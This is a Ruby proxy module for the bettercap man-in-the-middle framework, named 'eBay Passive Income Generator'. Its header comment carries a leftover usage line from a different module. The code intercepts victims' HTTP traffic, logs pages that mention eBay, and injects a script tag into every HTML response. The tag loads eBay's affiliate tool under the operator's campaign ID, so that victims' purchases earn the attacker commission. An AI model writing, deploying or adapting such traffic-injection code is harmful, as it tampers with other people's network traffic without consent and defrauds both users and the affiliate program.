=begin
BETTERCAP
Author : Simone 'evilsocket' Margaritelli
Email  : evilsocket@gmail.com
Blog   : http://www.evilsocket.net/
Usage  : bettercap --proxy-module bettercap-proxy-modules/http/download_autopwn.rb --download-autopwn-extensions EXT1,EXT2 --download-autopwn-path bettercap-proxy-modules/http/download_autopwn/ --download-autopwn-port 8042
This project is released under the GPL 3 license.
=end

require 'uri'
require 'cgi'
require 'net/http'

class EbayPassiveIncomeGenerator < BetterCap::Proxy::HTTP::Module
  meta(
    'Name'        => 'eBay Passive Income Generator',
    'Description' => "Replace eBay product links with your affiliate link and get a piece of the pie.",
    'Version'     => '1.0.0',
    'Author'      => "yungtravla",
    'License'     => 'GPL3'
  )

  @@ebayTag = "e".bold.red + "b".bold.blue + "a".bold.yellow + "y".bold.green
  @@ebayCampaignId = nil

  def self.on_options(opts)
    opts.on( '--ebay-campaign-id ID', "Enter your eBay campaign ID. (you can find this at " + "https://epn.ebay.com".green + " by inspecting the source)" ) do |v|
      @@ebayCampaignId = v.strip
    end
  end

  def initialize
    BetterCap::Logger.info "[" + @@ebayTag + "] Passive income generator starting ..."

    # Check options
    raise BetterCap::Error, "No --ebay-campaign-id option provided. (You can find this in the 'Create Promotable Links Automatically' section at https://epn.ebay.com)" if @@ebayCampaignId.nil?
    BetterCap::Logger.raw "\n  Campaign ID : #{@@ebayCampaignId.green}\n\n"
  end

  def on_request(request, response)
    @@url = "#{request.base_url}#{request.path}"

    # Sniff for ebay links
    if response.body.include?("ebay.") && response.body.include?("/itm/")
      BetterCap::Logger.raw "[" + @@ebayTag + "] Found reference to ebay item(s) on this page : " + "#{@@url}".green
    elsif response.body.include?("ebay.")
      BetterCap::Logger.raw "[" + @@ebayTag + "] Found reference to ebay on this page : " + "#{@@url}".green
    end

    # Inject script
    if response.content_type =~ /^text\/html.*/
      injection = "<script type='text/javascript'>window._epn = {campaign:#{@@ebayCampaignId}};</script><script type='text/javascript' src='https://epnt.ebay.com/static/epn-smart-tools.js'></script></head>"
      response.body.sub!( /<\/head>/i ) { injection }
    end
  end
end
